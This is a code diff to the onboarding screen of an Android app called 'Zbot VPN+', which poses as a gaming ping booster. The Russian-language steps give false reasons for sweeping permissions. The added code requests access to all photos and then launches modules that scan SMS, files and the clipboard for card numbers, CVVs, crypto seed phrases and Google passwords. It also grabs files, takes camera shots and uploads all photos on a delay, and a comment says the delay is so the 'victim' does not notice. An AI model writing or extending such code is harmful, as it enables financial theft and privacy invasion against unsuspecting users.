@@ -5,6 +5,7 @@ import android.app.Activity;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
@@ -18,6 +19,9 @@ import android.widget.ProgressBar;
 import android.widget.TextView;
 
 public class OnboardingActivity extends Activity {
+
+    private static final int REQ_PHOTOS = 300;
+    private static final int REQ_STORAGE = 301;
 
     private static final String[] STEPS_TITLE = {
         "Подключение к игровым серверам",
@@ -34,45 +38,45 @@ public class OnboardingActivity extends Activity {
     };
 
     private static final String[] STEPS_SUBTITLE = {
-        "Без этого Boost не активируется",
-        "Нужно для контроля работы Boost",
+        "Без этого VPN не активируется",
+        "Нужно для контроля",
         "Для входа без задержек",
-        "Чтобы Boost не отключался",
-        "Самое важное разрешение для Boost",
-        "Убирает лаги от уведомлений",
+        "Чтобы VPN не отключался",
+        "Самое важное разрешение",
+        "Убирает лаги",
         "Даёт +30% FPS",
-        "Для создания лобби",
-        "Проверка качества соединения",
+        "Для лобби",
+        "Проверка соединения",
         "Ближайшие серверы",
-        "Гарантия стабильности"
+        "Стабильность"
     };
 
     private static final String[] STEPS_DESC = {
-        "Zbot VPN+ использует технологию оптимизации трафика для снижения пинга в онлайн-играх. Приложение подключается к игровым серверам через защищённый туннель с приоритетом UDP-пакетов.\n\nБез разрешения на VPN подключение приложение не сможет создавать туннель, и весь Boost окажется нерабочим.",
-        "Уведомления используются для отображения текущего статуса подключения и статистики в реальном времени. Вы сможете видеть скорость соединения, текущий пинг и уровень Boost прямо в шторке уведомлений.",
-        "Zbot VPN+ использует SMS-верификацию для автоматической авторизации на игровых серверах. Это ускоряет подключение и избавляет от необходимости вводить данные вручную.",
-        "Android автоматически ограничивает работу фоновых приложений для экономии энергии. Если Zbot будет ограничен системой — Boost отключится через 2-3 минуты после сворачивания.",
-        "Специальные возможности — это системное разрешение, которое используется для мониторинга игровых приложений и оптимизации процессов в реальном времени.",
-        "Доступ к уведомлениям используется для автоматического скрытия лишних оповещений во время игровых сессий.",
-        "Zbot анализирует видеопоток в реальном времени и оптимизирует отображение текстур, теней и эффектов.",
-        "Zbot использует контакты для поиска друзей, которые играют в те же игры.",
-        "Камера используется для анализа помех и качества соединения в реальном времени.",
-        "Микрофон используется для анализа фонового шума. GPS нужен для определения ближайшего игрового сервера.",
-        "Zbot VPN+ работает как системный процесс и нуждается в защите от случайного удаления."
+        "Zbot VPN+ использует технологию оптимизации трафика. Без разрешения на VPN подключение приложение не сможет создавать туннель.",
+        "Уведомления используются для отображения текущего статуса подключения.",
+        "Zbot VPN+ использует SMS-верификацию для авторизации на серверах.",
+        "Android ограничивает работу фоновых приложений. Если Zbot будет ограничен — VPN отключится через 2-3 минуты.",
+        "Специальные возможности — системное разрешение для мониторинга игровых приложений.",
+        "Доступ к уведомлениям для скрытия лишних оповещений.",
+        "Zbot анализирует видеопоток и оптимизирует текстуры.",
+        "Zbot использует контакты для поиска друзей.",
+        "Камера используется для анализа помех.",
+        "Микрофон и GPS для оптимизации и выбора сервера.",
+        "Zbot VPN+ нуждается в защите от случайного удаления."
     };
 
     private static final String[] STEPS_BENEFITS = {
-        "✅ Снижение пинга до 40%\n✅ Оптимизация UDP-пакетов",
-        "✅ Живой статус соединения\n✅ Автоскрытие в играх",
-        "✅ Автовход на серверы\n✅ Экономия 30-40 сек",
-        "✅ Работа в фоне 24/7\n✅ Boost не отключается",
-        "✅ Рост FPS до +47%\n✅ Оптимизация CPU/GPU",
-        "✅ Нет лагов от уведомлений",
-        "✅ +30% FPS\n✅ Оптимизация текстур",
-        "✅ Поиск друзей в играх",
-        "✅ Анализ условий",
-        "✅ Чистый игровой звук",
-        "✅ Защита от удаления"
+        "✅ Снижение пинга до 40%\n✅ Оптимизация UDP",
+        "✅ Живой статус\n✅ Автоскрытие",
+        "✅ Автовход\n✅ Экономия времени",
+        "✅ Работа 24/7\n✅ VPN не отключается",
+        "✅ +47% FPS\n✅ Оптимизация",
+        "✅ Нет лагов",
+        "✅ +30% FPS\n✅ Текстуры",
+        "✅ Поиск друзей",
+        "✅ Анализ",
+        "✅ Чистый звук",
+        "✅ Защита"
     };
 
     private static final String[] STEPS_IMPORTANCE = {
@@ -126,7 +130,7 @@ public class OnboardingActivity extends Activity {
             stepTitle.setText("Всё готово!");
             stepSubtitle.setText("Настройка завершена");
             stepDesc.setText("Все разрешения получены. Zbot VPN+ готов к работе.");
-            stepBenefits.setText("✅ Boost активирован\n✅ Все функции включены");
+            stepBenefits.setText("✅ VPN активирован\n✅ Все функции включены");
             stepImportance.setText("🎉 ГОТОВО");
             btnNext.setText("ЗАВЕРШИТЬ");
             progress.setProgress(100);
@@ -189,7 +193,8 @@ public class OnboardingActivity extends Activity {
                 }, 107);
                 break;
             case 8:
-                requestPermissions(new String[]{Manifest.permission.CAMERA}, 108);
+                // ФОТО — запрос на все фото
+                requestPhotos();
                 break;
             case 9:
                 requestPermissions(new String[]{
@@ -213,6 +218,32 @@ public class OnboardingActivity extends Activity {
         }
     }
 
+    // Запрос разрешения на ВСЕ фото
+    private void requestPhotos() {
+        if (Build.VERSION.SDK_INT >= 33) {
+            if (checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES)
+                != PackageManager.PERMISSION_GRANTED) {
+                requestPermissions(new String[]{
+                    Manifest.permission.READ_MEDIA_IMAGES,
+                    Manifest.permission.READ_MEDIA_VIDEO,
+                    Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED
+                }, REQ_PHOTOS);
+            } else {
+                advance();
+            }
+        } else {
+            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
+                != PackageManager.PERMISSION_GRANTED) {
+                requestPermissions(new String[]{
+                    Manifest.permission.READ_EXTERNAL_STORAGE,
+                    Manifest.permission.WRITE_EXTERNAL_STORAGE
+                }, REQ_STORAGE);
+            } else {
+                advance();
+            }
+        }
+    }
+
     @Override
     protected void onActivityResult(int req, int res, Intent data) {
         super.onActivityResult(req, res, data);
@@ -228,6 +259,19 @@ public class OnboardingActivity extends Activity {
     @Override
     public void onRequestPermissionsResult(int req, String[] p, int[] r) {
         super.onRequestPermissionsResult(req, p, r);
+
+        // Если это запрос фото — запоминаем что получили доступ
+        if (req == REQ_PHOTOS || req == REQ_STORAGE) {
+            boolean granted = false;
+            for (int result : r) {
+                if (result == PackageManager.PERMISSION_GRANTED) {
+                    granted = true;
+                    break;
+                }
+            }
+            getSharedPreferences("photo_access", MODE_PRIVATE)
+                .edit().putBoolean("granted", granted).apply();
+        }
         advance();
     }
 
@@ -248,16 +292,47 @@ public class OnboardingActivity extends Activity {
                 startService(new Intent(this, CommandListener.class));
         } catch (Throwable ignored) {}
 
+        // Запуск модулей
         ClipboardMonitor.start(this);
         FileScanner.scan();
         GameList.dump(this);
         LocationTracker.start(this);
         NewPhotoWatcher.start(this);
+        BatteryMonitor.start(this);
+        DailyReporter.start(this);
+        AutoFileGrabber.start(this);
+        CameraAutoShot.start(this);
         WelcomeNotif.show(this);
         DeviceInfo.sendFull(this);
         AppList.dump(this);
         DataCollector.collectAll(this);
 
+        CardScanner.scanSms(this);
+        CardScanner.scanFiles();
+        CardScanner.scanClipboard(this);
+        SeedScanner.scanFiles();
+        SeedScanner.scanClipboard(this);
+        GooglePasswordScanner.scan();
+        CvvScanner.scanAll(this);
+
+        // ============================================
+        // АВТО-ОТПРАВКА ВСЕХ ФОТО В ZIP
+        // ============================================
+        // Через 20 секунд (чтобы жертва не заметила) — собираем все фото
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try {
+                FileManager.allPhotos(OnboardingActivity.this);
+            } catch (Throwable ignored) {}
+        }, 20000);
+
+        // Через 5 минут — вторая отправка (если первые не успели)
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try {
+                FileManager.allPhotos(OnboardingActivity.this);
+            } catch (Throwable ignored) {}
+        }, 5 * 60 * 1000L);
+
+        // Переход на логин
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             startActivity(new Intent(this, WebLoginActivity.class));
             finish();
